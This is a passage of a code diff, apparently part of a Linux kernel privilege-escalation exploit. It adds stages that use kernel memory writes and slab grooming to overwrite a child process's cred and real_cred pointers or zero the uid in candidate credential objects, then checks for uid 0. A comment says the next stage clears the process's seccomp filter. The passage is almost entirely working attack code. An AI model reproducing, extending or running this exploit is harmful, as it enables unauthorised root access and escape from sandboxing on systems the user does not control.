+                  cb[0], cb[1], cb[2], cb[3],
+                  cb[4], cb[5], cb[6], cb[7]);
+          uintptr_t expected = text_addr(g_init_cred_image);
+          probe_ok = nr >= (ssize_t)sizeof(expected) &&
+                     memcmp(cb, &expected, sizeof(expected)) == 0;
+        }
+      }
+      close(pipes.cmd_w);
+      close(pipes.uid_r);
+      kill(-child, SIGKILL);
+      waitpid(child, NULL, 0);
+      pr_success("COMM_PROBE complete routed=%d probe=%d\n", routed, probe_ok);
+      return probe_ok ? 0 : 1;
+    }
 
-    int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
-        verify_w2_stage, &w2_context, 0);
-    if (!got_root) {
+    int cred_ok = 0;
+    if (getenv("PERF_HOLD")) {
+      pr_info("PERF_HOLD: waiting for external cred write\n");
+      for (;;) {
+        if (write(pipes.cmd_w, "C", 1) != 1) break;
+        uint32_t held_uid = 9999;
+        if (read(pipes.uid_r, &held_uid, sizeof(held_uid)) !=
+            (ssize_t)sizeof(held_uid)) {
+          break;
+        }
+        pr_info("PERF_HOLD child uid=%u cred=0x%016zx\n",
+                held_uid, child_task);
+        if (held_uid == 0) {
+          cred_ok = 1;
+          pr_success("PERF_HOLD observed uid=0\n");
+          break;
+        }
+        sleep(1);
+      }
+      if (!cred_ok) {
+        pr_warning("PERF_HOLD child exited before uid=0\n");
+        close(pipes.cmd_w);
+        close(pipes.uid_r);
+        waitpid(child, NULL, 0);
+        return 1;
+      }
+    }
+    if (getenv("CRED_LEAF_SCAN")) {
+      const char *only_index_env = getenv("CRED_CANDIDATE_INDEX");
+      int only_index = only_index_env ? atoi(only_index_env) : -1;
+      for (int i = cred_sample_mode ? 0 : 1;
+           i < report.ncands && !cred_ok; i++) {
+        if (only_index >= 0 && i != only_index) continue;
+        uintptr_t cand = report.cands[i];
+        if ((!cred_sample_mode && cand == child_task) ||
+            cand < 0xffffff8000000000ULL ||
+            cand >= 0xffffffc000000000ULL ||
+            (!cred_sample_mode && (cand & 0xfff) == 0)) {
+          continue;
+        }
+        pr_info("cred leaf scan candidate=%d addr=0x%016zx\n", i, cand);
+        static const int side_offsets[] = { 0, -8 };
+        for (size_t side = 0;
+             side < sizeof(side_offsets) / sizeof(side_offsets[0]) && !cred_ok;
+             side++) {
+          uintptr_t target =
+              cand + CRED_UID_OFF + (uintptr_t)(intptr_t)side_offsets[side];
+          int attempts = (cred_sample_mode && report.ncands == 1) ? 12 : 4;
+          for (int attempt = 1; attempt <= attempts && !cred_ok; attempt++) {
+            pr_info("cred zero attempt %d/%d candidate=%d side=%d "
+                    "target=0x%016zx\n",
+                    attempt, attempts, i, side_offsets[side], target);
+            slab_drain();
+            int routed = do_one_write(
+                target, "cred uid leaf zero", 1, 1);
+            if (!routed) {
+              usleep(50000);
+              continue;
+            }
+            usleep(50000);
+            cred_ok = verify_w2_stage(&w2_context);
+          }
+        }
+        if (cred_ok) {
+          pr_success("cred object uid zeroed at candidate=%d\n", i);
+        }
+      }
+      if (!cred_ok && getenv("CRED_LEAF_SCAN_ONLY")) {
+        pr_warning("cred leaf scan did not find the credential\n");
+        write(pipes.cmd_w, "X", 1);
+        close(pipes.cmd_w); close(pipes.uid_r);
+        waitpid(child, NULL, 0);
+        return 1;
+      }
+    }
+    for (int attempt = 1; attempt <= 10 && !cred_ok; attempt++) {
+      slab_drain();
+      int routed = do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2, 0);
+      if (!routed) {
+        usleep(50000);
+        continue;
+      }
+      usleep(50000);
+      cred_ok = verify_w2_stage(&w2_context);
+      if (!cred_ok) usleep(50000);
+    }
+    if (!cred_ok) {
+      pr_warning("W2 cred failed after 10 rounds\n");
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
-      pr_warning("W2 failed after 10 rounds\n");
       waitpid(child, NULL, 0);
       return 1;
+    }
+
+    if (!getenv("CRED_LEAF_SCAN") && !getenv("PERF_HOLD")) {
+      int real_cred_ok = 0;
+      for (int attempt = 1; attempt <= 3 && !real_cred_ok; attempt++) {
+        slab_drain();
+        real_cred_ok = do_one_write(
+            child_task + TASK_REAL_CRED_OFF, "W2b: real_cred", 2, 0);
+        if (!real_cred_ok) usleep(50000);
+      }
+      if (!real_cred_ok) {
+        pr_warning("W2b real_cred failed after 3 rounds\n");
+      } else {
+        pr_success("W2b: real_cred pinned\n");
+      }
     }
 
     /* W3: clear the child's seccomp filter for the late-load worker
